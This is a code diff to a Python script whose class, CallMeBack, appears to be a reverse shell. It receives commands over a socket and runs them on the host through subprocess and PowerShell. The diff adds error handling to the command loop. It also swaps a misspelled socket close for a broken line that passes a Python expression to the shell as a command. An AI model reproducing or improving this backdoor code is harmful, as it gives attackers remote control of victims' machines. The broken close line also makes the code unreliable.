@@ -54,9 +54,12 @@ class CallMeBack:
         path = os.getcwd()+ ' > '
         SendBack.sendall(bytes(path.encode()))     
         while True :
-            data = SendBack.recv(4096).decode('latin-1')
+            try:
+                data = SendBack.recv(4096).decode('latin-1')
+            except OSError:
+               exit()
             if not data:
-                SendBack.cloes()
+                subprocess.call('SendBack.close()',shell=True,stderr=subprocess.PIPE) 
             try:
                 if 'powershell' in data:
                     Data = subprocess.run(["powershell.exe",data.split()[1] ], shell=True, capture_output=True)
@@ -133,7 +136,5 @@ class CallMeBack:
                         
             except Exception :
                continue 
-        
-
 if __name__=='__main__':
      CallMeBack()
